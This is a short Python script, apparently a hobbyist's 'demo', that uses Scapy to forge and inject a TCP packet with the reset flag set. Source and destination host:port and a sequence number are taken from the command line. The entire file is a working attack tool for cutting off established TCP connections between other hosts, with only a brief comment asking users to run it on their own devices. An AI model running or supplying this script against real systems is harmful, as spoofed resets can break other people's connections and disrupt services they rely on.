#!/usr/bin/python3



#Demo For TCP Reset Attack..
#@BY 0xSYN
#Please use it in ur own Devices..

import sys
from getopt import getopt
from colorama import Fore , Style


class PACKET:
	SHost = None
	SPort = None
	DHost = None
	DPort = None
	SeqNum = None

pkt = PACKET()

def help():
	page = """TcpReset: TCP Reset Attack Script.
@By: 0xSYN

Usage:
	./TcpReset -s/--src HOST:PORT -d/--dst HOST:PORT -n/--sn SEQUENCE_NUMBER"""
	print(page)


def GetOptions():
	argv = sys.argv[1:]
	if len(argv) == 0:
		help()
	else:
		global opts
		opts , args = getopt(argv , "s:d:n:" , ["src=" , "dst=" , "sn="])


def GetRequirements():
	global opts , pkt	
	for option , value in opts:
		if option in ("-s" , "--src"):
			try:
				sv = value.split(":")
				pkt.SHost = sv[0]
				pkt.SPort = int(sv[1])
			except:
				help()
		elif option in ("-d" , "--dst"):
			try:
				sv = value.split(":")
				pkt.DHost = sv[0]
				pkt.DPort = int(sv[1])
			except:
				help()
		elif option in ("-n" , "--sn"):
			try:
				pkt.SeqNum = int(value)
			except:
				help()
		else:
			help()




def CreatePacket(): 
	IPLayer = IP(src=pkt.SHost , dst=pkt.DHost)
	TCPLayer = TCP(sport=pkt.SPort , dport=pkt.DPort , flags="R" , seq=pkt.SeqNum)
	Packet = IPLayer/TCPLayer
	return Packet

def InjectPacket(P):
	print("[+] Tring to Inject The Packet... : " , end="")
	try:
		send(P , verbose=0)
		print(Fore.LIGHTGREEN_EX , "Done" , Style.RESET_ALL)
	except:
		print(Fore.LIGHTRED_EX , "Error" , Style.RESET_ALL)
		exit()



print("[+] Check Scapy... : " , end="")
try:
	from scapy.all import IP , TCP , send
except:
	print(Fore.LIGHTRED_EX , "Error" , Style.RESET_ALL)
	print("Try to Download Scapy.")
	exit()	
print(Fore.LIGHTGREEN_EX , "Done" , Style.BRIGHT , Style.RESET_ALL)

GetOptions()
GetRequirements()
Packet = CreatePacket()
InjectPacket(Packet)